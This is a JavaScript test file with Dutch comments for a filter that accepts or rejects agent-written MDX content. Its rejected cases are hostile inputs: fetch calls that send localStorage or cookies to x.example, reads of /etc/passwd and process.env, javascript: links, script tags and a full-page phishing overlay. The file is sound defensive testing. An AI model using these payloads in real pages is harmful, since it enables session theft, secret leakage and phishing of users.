import test from 'node:test'
import assert from 'node:assert/strict'
import { toetsTekst } from './toets.mjs'

const rood = (naam, tekst) => test(`rood: ${naam}`, () => {
  const r = toetsTekst(tekst)
  assert.ok(r.rood.length > 0, `werd niet afgekeurd: ${JSON.stringify(tekst)}`)
})
const groen = (naam, tekst) => test(`groen: ${naam}`, () => {
  const r = toetsTekst(tekst)
  assert.deepEqual(r.rood, [], `ten onrechte afgekeurd: ${r.rood.join('; ')}`)
  assert.equal(r.gemeten, true)
})

// de zes gevallen van security (ed420d8e) en de vier uit de tweede ronde
rood('fetch in een expressie (sessie naar buiten)', "{fetch('https://x.example/?d='+JSON.stringify(localStorage))}\n")
rood('export const met await fetch', "export const x = await fetch('https://x.example')\n")
rood('import fs met expressie', "import fs from 'fs'\n\n{fs.readFileSync('/etc/passwd')}\n")
rood('process.env in een expressie', '{JSON.stringify(process.env)}\n')
rood('img met expressie-attribuut', "<img src={'https://x.example/?c='+document.cookie} />\n")
rood('extern markdown-plaatje (volgpixel)', '![](https://x.example/p.gif)\n')
rood('langere sluit-fence gevolgd door een expressie', "```\ncode\n````\n\n{fetch('https://x.example')}\n")
rood('geëscapete backticks rond een expressie', "\\`{fetch('https://x.example')}\\`\n")
// Ingesprongen gevallen: wat de parser (en dus de build) als code leest, is code; de rest is een expressie en rood.
// Dit is de reden om de echte parser te gebruiken in plaats van regexen (security, tweede ronde).
groen('fence met vier spaties ervoor is een codeblok volgens de parser', '    ```\n{process.env}\n    ```\n')
groen('fence met een tab ervoor is een codeblok volgens de parser', '\t```\n{process.env}\n\t```\n')
rood('een regel met een tab ervoor en een expressie is een expressie, geen code', '\t{process.env}\n')
// meer
rood('verwijzend plaatje', '![x][r]\n\n[r]: https://x.example/p.gif\n')
rood('protocol-relatief plaatje', '![](//x.example/p.gif)\n')
rood('javascript:-link', '[x](javascript:alert(1))\n')
rood('data:-link', '[x](data:text/html;base64,AAAA)\n')
rood('export default', 'export default function A() { return null }\n')
rood('andere import dan lucide-react', "import Script from 'next/script'\n\n<Script src=\"https://x.example\" />\n")
rood('lucide-import met alias', "import { Target as X } from 'lucide-react'\n")
rood('lucide-import default', "import Target from 'lucide-react'\n")
rood('lucide-import namespace', "import * as L from 'lucide-react'\n")
rood('lucide-import met kleine letter', "import { target } from 'lucide-react'\n")
rood('component dat niet is geïmporteerd', '<Target />\n')
rood('onbekend element', '<Foo />\n')
rood('kleine-letter img', '<img src="/a.png" />\n')
rood('a-element', '<a href="https://x.example">x</a>\n')
rood('script-element', '<script>alert(1)</script>\n')
rood('style-element', '<style>.a{color:red}</style>\n')
rood('iframe', '<iframe src="https://x.example"></iframe>\n')
rood('fragment', '<>tekst</>\n')
rood('spreadattribuut', "import { Target } from 'lucide-react'\n\n<Target {...props} />\n")
rood('onclick op een span', '<span onClick="x()">a</span>\n')
rood('style-attribuut op een span', '<span style="background:url(https://x.example)">a</span>\n')
rood('expressie-attribuut dat geen getal is', "import { Target } from 'lucide-react'\n\n<Target size={window.x} />\n")
rood('icoon met href', "import { Target } from 'lucide-react'\n\n<Target href=\"/x\" />\n")
rood('expressie met meer dan een commentaar', '{/* a */ x /* b */}\n')
rood('twee commentaren in één expressie', '{/* a */}{/* b */ fetch(1)}\n')
rood('kapotte MDX is niet te meten', '{ onafgesloten\n')

// groen: wat een agent normaal schrijft
groen('platte markdown met kop, lijst, tabel, externe link, relatief plaatje',
  '# Kop\n\n- een\n- twee\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n[link](https://kroescontrol.nl) en ![plaatje](/hub/x.png)\n')
groen('lucide-iconen met className en size={20}',
  "import { Shield, Lock } from 'lucide-react'\n\n### Kop <Shield className=\"heading-icon\" size={20} />\n\nTekst <Lock size={16} strokeWidth={2} />\n")
groen('een enkel commentaar tussen accolades', 'Tekst {/* niet zichtbaar */} verder.\n')
groen('br, span en div met className', 'Regel<br />twee <span className="x">a</span>\n\n<div className="kader">tekst</div>\n')
groen('codeblok met accolades en import erin (is gewoon tekst in een geldig blok)', "```tsx\nimport { A } from 'b'\nconst x = {y: 1}\n```\n")
groen('een HTML-entity als tekst', 'Schrijf &lt;img&gt; als tekst.\n')

// nazorg security (04-10): plaatjes buiten de map of zonder plaatjespad, en lagen over de pagina
rood('plaatje met ..', '![x](../../.env)\n')
rood('plaatje met een systeempad zonder extensie', '![x](/etc/passwd)\n')
rood('plaatje dat geen plaatjesbestand is', '![x](/hub/script.js)\n')
rood('plaatje met procent-codering in het pad', '![x](/hub/a%20b.png)\n')
rood('div over de hele pagina (phishing-vorm)', '<div className="fixed inset-0 z-50 bg-white">Log opnieuw in</div>\n')
rood('absolute positionering', '<div className="absolute top-0 left-0">x</div>\n')
rood('layout-klasse met variant-voorvoegsel', '<span className="md:fixed">x</span>\n')
rood('z-index', '<div className="z-10">x</div>\n')
groen('relatief plaatje met extensie', '![x](/hub/x.png) en ![y](./plaatjes/y.svg)\n')
groen('gewone klassen', '<div className="kader rounded p-4">tekst</div>\n')
groen('klasse die toevallig met top begint maar geen layout is', '<span className="topic-header">x</span>\n')

// security, tweede nazorg: arbitrary-klassen en varianten met uitroepteken
rood('arbitrary klasse [position:fixed]', '<div className="[position:fixed]">x</div>\n')
rood('belangrijk-vorm !fixed', '<div className="!fixed">x</div>\n')
rood('variant plus belangrijk md:!fixed', '<div className="md:!fixed">x</div>\n')
rood('variant plus arbitrary sm:[position:fixed]', '<div className="sm:[position:fixed]">x</div>\n')
rood('arbitrary [inset:0]', '<div className="[inset:0]">x</div>\n')
rood('arbitrary [z-index:9999]', '<div className="[z-index:9999]">x</div>\n')
rood('breuk-klasse met schuine streep', '<div className="w-1/2">x</div>\n')
rood('hoofdletters in een klasse', '<div className="Kader">x</div>\n')
groen('gewone klassen met varianten', '<div className="md:rounded-lg hover:bg-blue-500 p-4">x</div>\n')
